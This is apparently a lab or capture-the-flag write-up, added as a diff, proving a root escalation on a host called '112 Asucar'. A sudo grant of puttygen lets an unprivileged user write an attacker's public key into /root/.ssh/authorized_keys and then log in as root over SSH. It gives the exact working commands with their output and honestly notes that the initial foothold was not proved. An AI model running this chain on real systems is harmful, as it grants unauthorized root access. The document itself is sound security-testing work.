@@ -1,0 +1,146 @@
+================================================================================
+112 Asucar — the sudo puttygen escalation
+CWE-269 / CWE-250. The grant is real and this is the proof.
+================================================================================
+
+--- the grant, from /etc/sudoers (last line before @includedir) ---------------
+curiosito ALL=(root) NOPASSWD: /usr/bin/puttygen
+
+Note: NO wildcard in the command specification. The `sudo --help` argument
+splitting bypass (uid=-1) does not apply here. Reporting this as that CVE would
+be a wrong mechanism. The defect is that a write-capable binary was granted to an
+unprivileged user with no argument restriction.
+
+--- the grant read back from the RUNNING configuration (not the file) --------
+$ setpriv --reuid=curiosito --regid=curiosito --init-groups /bin/bash -c 'sudo -n -l'
+Matching Defaults entries for curiosito on fdf286c06d04:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User curiosito may run the following commands on fdf286c06d04:
+    (root) NOPASSWD: /usr/bin/puttygen
+
+================================================================================
+THE ORACLE WAS BUILT BEFORE THE EXPLOIT
+This vector has no output of its own — a successful sudo puttygen prints
+nothing. So the marker is a file only a root context can create.
+================================================================================
+
+Marker keypair, generated for this engagement:
+  comment    : lab112-oracle-marker-2026-09-30-a41f
+  algorithm  : RSA 2048
+  fingerprint: 2048 SHA256:93f541+bQNhiBtkR9am90w8pPrgKzPkXFM7wfaNO4TU (RSA)
+
+--- oracle BEFORE (must be absent) -------------------------------------------
+$ ls -la /root/.ssh/
+total 8
+drwx------ 2 root root 4096 May 12  2024 .
+drwx------ 1 root root 4096 May 12  2024 ..
+authorized_keys exists? NO
+marker line count: 0
+
+--- the two recalled mechanisms, refuted by the artefact -------------------
+(1) the form most write-ups quote:
+
+$ sudo -n /usr/bin/puttygen "ssh-rsa AAAA... a41f" -O save-as:/root/.ssh/authorized_keys
+puttygen: unknown output type `save-as:/root/.ssh/authorized_keys'
+puttygen exit=1
+
+(2) -O save-as corrected to an -O type this build has, but a bare key string:
+
+$ sudo -n /usr/bin/puttygen "ssh-rsa AAAA... a41f" -O public-openssh -o /root/.ssh/authorized_keys
+puttygen: unable to load file `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDArAr1dKtlujKcwNUe73ci7smLu1pthDuVfml0vA7ECSM5oMQil7bm1OCSG+pjbv9xl69CVH29Aup0Q0S+syqPmMmGMj8US1kMR3FLzwsolYg2MiTSF2/L5TypQ6XBfK8GbkkhImHk73PXxGTZmNC+3ilNBPTVW/f66dExHn+/B+DmAhxAGEOpJ/+oExCtb4X+8cDPQtCY4SufJ/JAlJLqqfZIOvrg2OiAdJNxRcTT3V2OOyAW1PpSn6L0XO40xrJMx2cR7hgVr7GOZ96Sn/gmut1N3L+dIXXokeDE1e6uB8RXOd/9bV/pagQbApd212guUvkh4h7UlbFaKEpvd1jJ lab112-oracle-marker-2026-09-30-a41f': No such file or directory
+puttygen exit=1
+
+PuTTYgen 0.78 does NOT accept a bare public-key string as its keyfile argument.
+It needs a FILE.
+
+--- the -O list, from the image's own --help --------------------------------
+  -O    specify output type:
+           private             output PuTTY private key format
+           private-openssh     export OpenSSH private key
+           private-openssh-new export OpenSSH private key (force new format)
+           private-sshcom      export ssh.com private key
+           public              RFC 4716 / ssh.com public key
+           public-openssh      OpenSSH public key
+           fingerprint         output the key fingerprint
+           cert-info           print certificate information
+           text                output the key components as 'name=0x####'
+
+`-O save-as:` is not in this build's list. Reading this from the image rather
+than from memory is the difference between a finding and a wrong report.
+
+================================================================================
+THE EXPLOIT, RUN AS curiosito
+================================================================================
+
+$ setpriv --reuid=curiosito --regid=curiosito --init-groups /bin/bash -c '...'
+
+  identity at this hop:
+    uid=1000(curiosito) gid=1000(curiosito) groups=1000(curiosito)
+    Uid: 1000 1000 1000 1000
+    Gid: 1000 1000 1000 1000
+    Groups: 1000
+    CapPrm: 0000000000000000
+    CapEff: 0000000000000000
+
+  attacker-controlled input, a public key FILE owned by curiosito:
+    $ install -m 644 -o curiosito -g curiosito /tmp/l112_oracle.pub /home/curiosito/lab112_key.pub
+    -rw-r--r-- 1 curiosito curiosito 418 Sep 30 09:17 /home/curiosito/lab112_key.pub
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDArAr1dKtlujKcwNUe73ci  (first 60 bytes)
+
+  the grant, used:
+    $ sudo -n /usr/bin/puttygen /home/curiosito/lab112_key.pub -O public-openssh -o /root/.ssh/authorized_keys
+    puttygen exit=0
+
+================================================================================
+THE ORACLE AFTER — the artefact only a root context could create
+================================================================================
+
+$ ls -la /root/.ssh/
+total 16
+drwx------ 1 root root 4096 Sep 30 09:17 .
+drwx------ 1 root root 4096 May 12  2024 ..
+-rw-r--r-- 1 root root  418 Sep 30 09:17 authorized_keys
+
+$ stat -c '%a %U:%G %n' /root/.ssh/authorized_keys
+644 root:root /root/.ssh/authorized_keys
+
+$ grep -c lab112-oracle-marker /root/.ssh/authorized_keys
+1
+
+$ cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDArAr1dKtlujKcwNUe73ci7smLu1pthDuVfml0vA7ECSM5oMQil7bm1OCSG+pjbv9xl69CVH29Aup0Q0S+syqPmMmGMj8US1kMR3FLzwsolYg2MiTSF2/L5TypQ6XBfK8GbkkhImHk73PXxGTZmNC+3ilNBPTVW/f66dExHn+/B+DmAhxAGEOpJ/+oExCtb4X+8cDPQtCY4SufJ/JAlJLqqfZIOvrg2OiAdJNxRcTT3V2OOyAW1PpSn6L0XO40xrJMx2cR7hgVr7GOZ96Sn/gmut1N3L+dIXXokeDE1e6uB8RXOd/9bV/pagQbApd212guUvkh4h7UlbFaKEpvd1jJ lab112-oracle-marker-2026-09-30-a41f
+
+================================================================================
+THE CHAIN CLOSES — identity measured inside the new session, not inferred
+================================================================================
+
+$ ssh -i l112_oracle -o StrictHostKeyChecking=no -o BatchMode=yes root@172.17.0.12 \
+      'id; grep -E "^(Uid|Gid|Groups)" /proc/self/status; whoami; \
+       echo "marker visible: $(grep -c lab112-oracle-marker /root/.ssh/authorized_keys)"; \
+       echo "hostname: $(hostname)"'
+
+uid=0(root) gid=0(root) groups=0(root)
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Groups:	0
+root
+marker visible: 1
+hostname: fdf286c06d04
+
+================================================================================
+HONEST SCOPE OF THIS RESULT
+================================================================================
+
+Hops 2 -> 3 are proved. Hop 0 -> 1 is NOT.
+
+Reaching curiosito here used container root (`setpriv --reuid=curiosito
+--init-groups`), because:
+  * curiosito's password is unknown (yescrypt hash in /etc/shadow, 0 candidates
+    tested against it — UNTESTED, not "uncrackable"), and
+  * WordPress credentials were never obtained (see credential-sweep.txt), and
+  * there is no unauthenticated RCE on this image (see plugin-defect.txt).
+
+So: the escalation is a real, reproduced, measured finding. The entry condition
+is not. Both facts belong in the report, separately — merging them would tell a
+reader that something was patched that was not reached.
